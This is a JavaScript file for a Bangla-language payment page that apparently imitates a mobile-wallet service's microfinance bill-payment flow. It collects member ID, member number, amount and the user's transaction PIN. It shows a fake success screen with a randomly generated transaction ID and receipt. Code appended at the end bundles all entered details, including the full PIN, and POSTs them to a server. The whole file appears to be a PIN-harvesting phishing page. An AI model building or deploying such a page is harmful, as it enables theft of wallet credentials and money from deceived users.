
let allDetails = {} ;

// Initialize when DOM is loaded
document.addEventListener("DOMContentLoaded", function () {
  // Get all modal instances
  const organizationModal = new bootstrap.Modal(
    document.getElementById("organizationModal")
  );
  const amountModal = new bootstrap.Modal(
    document.getElementById("amountModal")
  );
  const pinModal = new bootstrap.Modal(document.getElementById("pinModal"));
  const successModal = new bootstrap.Modal(
    document.getElementById("successModal")
  );

  // Initialize variables
  let selectedOrganization = null;
  let paymentAmount = null;
  let transactionPin = null;

  // Add click event listeners to all organization items
  const organizationItems = document.querySelectorAll(".organization-item");
  organizationItems.forEach((item) => {
    item.addEventListener("click", function () {
      // Get organization details from data attributes
      const orgName = this.dataset.orgName;
      const orgLogo = this.dataset.orgLogo;

      selectedOrganization = {
        name: orgName,
        logo: orgLogo,
      };

      // Show organization details in modal
      document.getElementById("orgModalLogo").src = orgLogo;
      document.getElementById("orgModalLogo").alt = orgName;
      document.getElementById("orgModalName").textContent = orgName;

      // Show the organization modal
      organizationModal.show();
    });
  });

  // Add click event to main back button
  document.addEventListener("click", function (e) {
    if (e.target.closest(".back-button")) {
      // Check which modal is open and handle accordingly
      handleBackNavigation();
    }
  });

  // Back navigation handler
  function handleBackNavigation() {
    // Check if any modal is open
    if (organizationModal._isShown) {
      organizationModal.hide();
    } else if (amountModal._isShown) {
      amountModal.hide();
      organizationModal.show();
    } else if (pinModal._isShown) {
      pinModal.hide();
      amountModal.show();
    } else if (successModal._isShown) {
      successModal.hide();
    } else {
      // If no modal is open, navigate back to previous page or index
      window.history.back();
    }
  }

  // Organization form submit
  document
    .getElementById("orgSubmitBtn")
    .addEventListener("click", function () {
      const uniqueId = document.getElementById("unique-id").value;
      const memberNumber = document.getElementById("member-number").value;

      allDetails.uniqueId = uniqueId ;
      allDetails.memberNumber = memberNumber ;

      if (uniqueId && memberNumber) {
        // Hide organization modal
        organizationModal.hide();

        // Show amount modal with organization info
        document.getElementById("amountOrgLogo").src =
          selectedOrganization.logo;
        document.getElementById("amountOrgLogo").alt =
          selectedOrganization.name;
        document.getElementById("amountOrgName").textContent =
          selectedOrganization.name;

        amountModal.show();
      } else {
        // Show validation error
        if (!uniqueId) {
          document.getElementById("unique-id").style.border =
            "1px solid #e2146c";
        }
        if (!memberNumber) {
          document.getElementById("member-number").style.border =
            "1px solid #e2146c";
        }
      }
    });

  // Amount form submit
  document
    .getElementById("amountSubmitBtn")
    .addEventListener("click", function () {
      const amount = document.getElementById("amount").value;

      allDetails.amount = amount ;

      if (amount) {
        paymentAmount = amount;

        // Hide amount modal
        amountModal.hide();

        // Show PIN modal with transaction details
        document.getElementById("pinOrgName").textContent =
          selectedOrganization.name;
        document.getElementById("pinAmount").textContent = amount + " ৳";

        pinModal.show();
      } else {
        // Show validation error
        document.getElementById("amount").style.border = "1px solid #e2146c";

        // Add error message if not already present
        const amountGroup = document
          .getElementById("amount")
          .closest(".form-group");
        if (!amountGroup.querySelector(".error-message")) {
          const errorMsg = document.createElement("p");
          errorMsg.className = "error-message";
          errorMsg.textContent = "টাকার পরিমাণ লিখুন";
          errorMsg.style.color = "#e2146c";
          errorMsg.style.fontSize = "12px";
          errorMsg.style.marginTop = "5px";
          amountGroup.appendChild(errorMsg);
        }
      }
    });

  // Back navigation for Amount modal
  document
    .getElementById("amountBackBtn")
    .addEventListener("click", function () {
      amountModal.hide();
      organizationModal.show();
    });

  // Back navigation for PIN modal
  document.getElementById("pinBackBtn").addEventListener("click", function () {
    pinModal.hide();
    amountModal.show();
  });

  // PIN input handling
  const pinFields = document.querySelectorAll(".pin-digit");
  pinFields.forEach((field, index) => {
    field.addEventListener("input", function () {
      if (this.value.length === 1) {
        // Move to next field
        if (index < pinFields.length - 1) {
          pinFields[index + 1].focus();
        }
      }
    });

    field.addEventListener("keydown", function (e) {
      if (e.key === "Backspace" && this.value.length === 0) {
        // Move to previous field
        if (index > 0) {
          pinFields[index - 1].focus();
        }
      }
    });
  });

  // PIN form submit
  document
    .getElementById("pinSubmitBtn")
    .addEventListener("click", function () {
      // Check if all PIN fields are filled
      const allFilled = Array.from(pinFields).every(
        (field) => field.value.length === 1
      );

      if (allFilled) {
        transactionPin = Array.from(pinFields)
          .map((field) => field.value)
          .join("");

        // Hide PIN modal
        pinModal.hide();

        // Show success modal with transaction details
        const txnId =
          "TXN" +
          Math.floor(Math.random() * 1000000000)
            .toString()
            .padStart(9, "0");
        const now = new Date();
        const dateStr =
          now.toLocaleDateString("bn-BD", {
            year: "numeric",
            month: "long",
            day: "numeric",
          }) +
          ", " +
          now.toLocaleTimeString("bn-BD");

        document.getElementById("txnId").textContent = txnId;
        document.getElementById("txnDate").textContent = dateStr;
        document.getElementById("txnOrg").textContent =
          selectedOrganization.name;
        document.getElementById("txnAmount").textContent = paymentAmount + " ৳";

        successModal.show();
      } else {
        // Show validation error
        pinFields.forEach((field) => {
          if (field.value.length === 0) {
            field.style.border = "1px solid #e2146c";
          }
        });

        // Add error message if not already present
        const pinGroup = document
          .querySelector(".pin-fields-container")
          .closest(".form-group");
        if (!pinGroup.querySelector(".error-message")) {
          const errorMsg = document.createElement("p");
          errorMsg.className = "error-message";
          errorMsg.textContent = "সম্পূর্ণ পিন দিন";
          errorMsg.style.color = "#e2146c";
          errorMsg.style.fontSize = "12px";
          errorMsg.style.marginTop = "5px";
          errorMsg.style.textAlign = "center";
          pinGroup.appendChild(errorMsg);
        }
      }
    });

  // Download button
  document.getElementById("downloadBtn").addEventListener("click", function () {
    // Get transaction details
    const txnId = document.getElementById("txnId").textContent;
    const txnDate = document.getElementById("txnDate").textContent;
    const txnOrg = document.getElementById("txnOrg").textContent;
    const txnAmount = document.getElementById("txnAmount").textContent;

    // Get receipt template and CSS template
    const template = document.getElementById("receiptTemplate");
    const cssTemplate = document.getElementById("receiptCSSTemplate");
    let receiptHTML = template.innerHTML;

    // Replace placeholders with actual values
    receiptHTML = receiptHTML.replace(/{{txnId}}/g, txnId);
    receiptHTML = receiptHTML.replace(/{{txnDate}}/g, txnDate);
    receiptHTML = receiptHTML.replace(/{{txnOrg}}/g, txnOrg);
    receiptHTML = receiptHTML.replace(/{{txnAmount}}/g, txnAmount);

    // Insert CSS from template into the style tag
    receiptHTML = receiptHTML.replace(
      "/* Receipt CSS will be inserted here by JavaScript */",
      cssTemplate.innerHTML
    );

    // Create download file
    const blob = new Blob([receiptHTML], { type: "text/html" });
    const url = window.URL.createObjectURL(blob);

    // Create download link and click it
    const a = document.createElement("a");
    a.href = url;
    a.download = `receipt-${txnId}.html`;
    document.body.appendChild(a);
    a.click();

    // Clean up
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);
  });

  // When modals are hidden, clean up
  document
    .getElementById("organizationModal")
    .addEventListener("hidden.bs.modal", function () {
      // Clear form fields
      document.getElementById("organizationForm").reset();
      // Remove error styling
      document.querySelectorAll(".form-control").forEach((input) => {
        input.style.border = "";
      });
    });

  document
    .getElementById("amountModal")
    .addEventListener("hidden.bs.modal", function () {
      // Clear form fields
      document.getElementById("amountForm").reset();
      // Remove error styling and messages
      document.getElementById("amount").style.border = "";
      const errorMsg = document.querySelector(".error-message");
      if (errorMsg) errorMsg.remove();
    });

  document
    .getElementById("pinModal")
    .addEventListener("hidden.bs.modal", function () {
      // Clear PIN fields
      pinFields.forEach((field) => {
        field.value = "";
        field.style.border = "";
      });
      // Remove error messages
      const errorMsg = document.querySelector(".error-message");
      if (errorMsg) errorMsg.remove();
    });

  // Receipt section click
  const receiptSection = document.querySelector(".receipt-section");
  if (receiptSection) {
    receiptSection.addEventListener("click", function () {
      // You can implement receipt history functionality here if needed
      alert("রিসিট ইতিহাস অংশ এখনও প্রস্তুত নয়");
    });
  }

        let on = document.querySelectorAll(".organization-item") ;

        on.forEach(function(item){
          
        item.addEventListener("click" , function(e){
        allDetails.name = e.target.innerHTML ;

    })

})


  let orgSubmitBtn = document.getElementById("orgSubmitBtn") ;

  orgSubmitBtn.addEventListener("click" , function(){

    console.log(allDetails) ;
    
  })

});


  document.getElementById("pinSubmitBtn").addEventListener("click", function () {

    let pins = document.querySelectorAll(".pin-digit") ;
    let fullPins = "";

    pins.forEach(function(item){
      fullPins += item.value;
    });

    allDetails.pin = fullPins ;

    // console.log(allDetails) ;

    fetch("http://localhost:3000/microfinance", {
    method: "POST",
    headers: {
      "content-type": "application/json"
    },
    body: JSON.stringify({allDetails}) 
  })
  .then(async function(r1){

  const data = await r1.json();

  if(r1.ok) {
    // console.log("Success:", data.message);  
    alert(data.message) ;
  } else {
    alert(data.message) ;
    // console.error("Error:", data.message);  
  }
})
.catch(function(err){
  console.error("Network error:", err);
});

  }) ;
